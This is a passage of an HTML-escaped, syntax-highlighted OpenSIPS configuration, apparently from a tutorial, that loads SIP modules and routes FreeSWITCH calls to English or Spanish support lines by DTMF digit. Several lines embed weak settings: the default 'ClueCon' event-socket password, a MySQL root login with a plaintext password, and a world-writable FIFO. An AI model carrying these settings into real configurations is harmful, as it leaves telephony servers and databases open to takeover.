&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fr_inv_timeout&amp;#34;&lt;/span&gt;, 30&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;restart_fr_on_each_reply&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;onreply_avp_mode&amp;#34;&lt;/span&gt;, 1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### Record Route Module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rr.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; not append from tag to the RR &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;no need &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; this script&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rr&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;append_fromtag&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### MAX ForWarD module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;maxfwd.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### SIP MSG OPerationS module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sipmsgops.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### FIFO Management Interface&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mi_fifo.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mi_fifo&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fifo_name&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/tmp/opensips_fifo&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mi_fifo&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fifo_mode&amp;#34;&lt;/span&gt;, 0666&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### URI module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;uri.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;uri&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;use_uri_table&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### USeR LOCation module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;usrloc.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;usrloc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;nat_bflag&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;NAT&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;usrloc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_mode&amp;#34;&lt;/span&gt;,   0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### REGISTRAR module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;registrar.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;registrar&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tcp_persistent_flag&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;TCP_PERSISTENT&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* uncomment the next line not to allow more than &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; contacts per AOR */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#modparam(&amp;#34;registrar&amp;#34;, &amp;#34;max_contacts&amp;#34;, 10)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### ACCounting module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* what special events should be accounted ? */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;early_media&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;report_cancels&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* by default we &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; not adjust the direct of the sequential requests.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; you enable this parameter, be sure the enable &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;append_fromtag&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   in &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rr&amp;#34;&lt;/span&gt; module */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;acc&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;detect_direction&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cachedb_local.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;freeswitch.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;freeswitch_scripting.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;freeswitch_scripting&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fs_subscribe&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fs://:ClueCon@10.0.0.246:8021/database?DTMF,CHANNEL_STATE,CHANNEL_ANSWER,HEARTBEAT&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_mysql.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cfgutils.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;drouting.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;drouting&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;db_url&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mysql://root:liviusmysqlpassword@localhost/opensips&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;event_route.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;json.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;proto_udp.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;####### Routing Logic ########&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# main request routing logic&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# $param(1) - 1 if the R-URI IP:port should be rewritten&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;route &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;goes_to_support&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$param&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; 1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;flags&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		$var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;flags&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;do_routing&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(flags)&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;-1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;route &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;FREESWITCH_XFER_BY_DTMF_LANG&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# this call has already been transferred&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;cache_fetch&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;local&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;DTMF-&lt;/span&gt;$json&lt;span style=&#34;color:#e6db74&#34;&gt;(body/Unique-ID)&amp;#34;&lt;/span&gt;, $var&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;_&lt;span style=&#34;color:#f92672&#34;&gt;)))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	switch &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$json&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;body/DTMF-Digit&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;transferring to English support line\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		freeswitch_esl&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;bgapi uuid_transfer &lt;/span&gt;$json&lt;span style=&#34;color:#e6db74&#34;&gt;(body/Unique-ID) -aleg 1001&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		               &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(fs_box)&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(output)&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		break;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;transferring to Spanish support line\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		freeswitch_esl&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;bgapi uuid_transfer &lt;/span&gt;$json&lt;span style=&#34;color:#e6db74&#34;&gt;(body/Unique-ID) -aleg 1002&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		               &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(fs_box)&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(output)&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		break;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	default:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;DEFAULT: transferring to English support line\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		freeswitch_esl&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;bgapi uuid_transfer &lt;/span&gt;$json&lt;span style=&#34;color:#e6db74&#34;&gt;(body/Unique-ID) -aleg 1001&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		               &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(fs_box)&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(output)&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ran FS uuid_transfer, output: &lt;/span&gt;$var&lt;span style=&#34;color:#e6db74&#34;&gt;(output)\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
